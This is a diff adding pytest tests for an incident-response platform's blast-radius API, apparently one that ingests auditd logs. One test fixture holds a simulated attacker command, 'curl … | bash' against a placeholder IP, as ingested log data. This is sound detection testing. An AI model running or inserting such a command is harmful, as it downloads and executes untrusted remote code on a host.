@@ -71,7 +71,7 @@ def test_blast_radius_contributing_nodes_structure(client):
 
 
 def test_blast_radius_unknown_host_in_graph_returns_zero_not_error(client):
-    """Hosts in the incident graph but not in topology (e.g. IP addresses) get score=0."""
+    """Hosts in the incident graph but not in topology (e.g. IP addresses) get score=0 and accurate error."""
     client.post("/api/scenarios/clear")
     replay = client.post("/api/scenarios/SCENARIO_1_SSH_COMPROMISE/replay").json()
     incident_id = replay["incident_id"]
@@ -82,3 +82,64 @@ def test_blast_radius_unknown_host_in_graph_returns_zero_not_error(client):
     if ip_entry is not None:
         assert ip_entry["score"] == 0.0
         assert ip_entry["contributing_nodes"] == []
+        assert ip_entry.get("error") == "Target host is not mapped to the configured topology."
+
+
+def test_blast_radius_live_incident_with_aliased_target(client):
+    """A live-ingested incident targeting target-linux-01 gets computed blast radius via alias."""
+    # Ingest a live auditd event for target-linux-01
+    auditd_rec = {
+        "type": "EXECVE",
+        "msg": "audit(1705284000.123:9901)",
+        "argc": 3,
+        "a0": "/bin/bash",
+        "a1": "-c",
+        "a2": "curl -s http://198.51.100.45/p | bash",
+        "exe": "/bin/bash",
+        "auid": "1000",
+        "uid": "0",
+        "host": "target-linux-01",
+    }
+    ingest_res = client.post("/api/ingest/raw", json={
+        "source_type": "auditd_execve",
+        "records": [auditd_rec],
+        "site_id": "site-01",
+    }).json()
+    incident_id = ingest_res.get("incident_id")
+    assert incident_id, f"Expected incident_id from live ingest, got {ingest_res}"
+
+    r = client.get(f"/api/incidents/{incident_id}/blast-radius")
+    assert r.status_code == 200
+    data = r.json()
+    host_entry = next((h for h in data["hosts"] if h["host"] == "target-linux-01"), None)
+    assert host_entry is not None, f"Expected target-linux-01 in {data['hosts']}"
+    assert host_entry["score"] > 10.0
+    assert len(host_entry["contributing_nodes"]) > 0
+    assert host_entry.get("canonical_host") == "target-web-01"
+
+
+def test_blast_radius_empty_target_hosts(client):
+    """An incident graph with no target_host nodes returns empty hosts array, not 404."""
+    # Create incident with empty graph
+    from sqlmodel import Session
+    from app.database import engine
+    from app.models import Incident
+    with Session(engine) as session:
+        inc = Incident(
+            incident_id="INC-EMPTY-GRAPH-TEST",
+            title="Test Empty Incident",
+            status="open",
+            risk_score=10.0,
+            confidence=0.5,
+            mission_impact="low",
+            graph_json={"nodes": [{"id": "user:test", "type": "user", "data": {"label": "test"}}], "edges": []},
+            source="demo"
+        )
+        session.add(inc)
+        session.commit()
+
+    r = client.get("/api/incidents/INC-EMPTY-GRAPH-TEST/blast-radius")
+    assert r.status_code == 200
+    data = r.json()
+    assert data["incident_id"] == "INC-EMPTY-GRAPH-TEST"
+    assert data["hosts"] == []
